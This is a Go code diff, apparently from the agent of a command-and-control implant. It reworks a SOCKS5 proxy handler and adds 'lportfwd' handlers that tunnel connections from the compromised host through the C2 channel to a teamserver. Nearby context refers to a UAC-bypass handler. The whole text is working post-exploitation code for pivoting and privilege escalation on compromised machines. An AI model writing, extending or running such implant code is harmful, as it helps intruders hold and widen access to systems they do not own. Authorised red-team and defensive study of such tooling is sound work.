@@ -220,15 +220,29 @@ func handleComputerDefaultsUAC(task Task, res *TaskResult) {
 }
 
 func handleSocks(task Task, res *TaskResult) {
-	port := task.Command
-	if port == "" {
-		port = "1080"
+	cmd := strings.TrimSpace(task.Command)
+	if strings.EqualFold(cmd, "stop") || strings.HasPrefix(strings.ToLower(cmd), "stop") {
+		arg := strings.TrimSpace(strings.TrimPrefix(cmd, "stop"))
+		arg = strings.TrimPrefix(arg, ":")
+		arg = strings.TrimSpace(arg)
+		if err := stopSocksServer(arg); err != nil {
+			res.Error = err.Error()
+			return
+		}
+		res.Output = "SOCKS5 stopped"
+		return
 	}
-	if err := startSocksServer("0.0.0.0:" + port); err != nil {
+	addr := cmd
+	if addr == "" {
+		addr = "0.0.0.0:1080"
+	} else if !strings.Contains(addr, ":") {
+		addr = "0.0.0.0:" + addr
+	}
+	if err := startSocksServer(addr); err != nil {
 		res.Error = "SOCKS5 failed to start: " + err.Error()
 		return
 	}
-	res.Output = "SOCKS5 started on " + port
+	res.Output = "SOCKS5 started on " + addr + " (CONNECT/BIND/UDP ASSOCIATE; tunnel CIDRs apply when set)"
 }
 
 func handleRPortFwdStart(task Task, res *TaskResult) {
@@ -265,6 +279,46 @@ func handleRPortFwdStop(task Task, res *TaskResult) {
 		res.Output = fmt.Sprintf("rportfwd on :%d stopped (%d active bridge(s) closed)", lport, activeConns)
 	} else {
 		res.Output = fmt.Sprintf("rportfwd on :%d stopped", lport)
+	}
+}
+
+// handleLPortFwdStart binds a loopback listener on the agent and tunnels every
+// accepted connection through the C2 channel; the teamserver dials the final
+// target. Parameter format matches rportfwd: "<lport>|<targetHost:targetPort>".
+func handleLPortFwdStart(task Task, res *TaskResult) {
+	parts := strings.SplitN(task.Command, "|", 2)
+	if len(parts) < 2 {
+		res.Error = "format: lport|targetHost:targetPort"
+		return
+	}
+	lport, err := strconv.Atoi(strings.TrimSpace(parts[0]))
+	if err != nil {
+		res.Error = "invalid lport: " + parts[0]
+		return
+	}
+	addr, err := startLPortForward(lport, strings.TrimSpace(parts[1]))
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	res.Output = fmt.Sprintf("lportfwd listening on %s (tunneled) -> %s", addr, parts[1])
+}
+
+func handleLPortFwdStop(task Task, res *TaskResult) {
+	lport, err := strconv.Atoi(strings.TrimSpace(task.Command))
+	if err != nil {
+		res.Error = "usage: lportfwd_stop <lport>"
+		return
+	}
+	activeConns, err := stopLPortForward(lport)
+	if err != nil {
+		res.Error = err.Error()
+		return
+	}
+	if activeConns > 0 {
+		res.Output = fmt.Sprintf("lportfwd on :%d stopped (%d tunneled connection(s) closed)", lport, activeConns)
+	} else {
+		res.Output = fmt.Sprintf("lportfwd on :%d stopped", lport)
 	}
 }
 
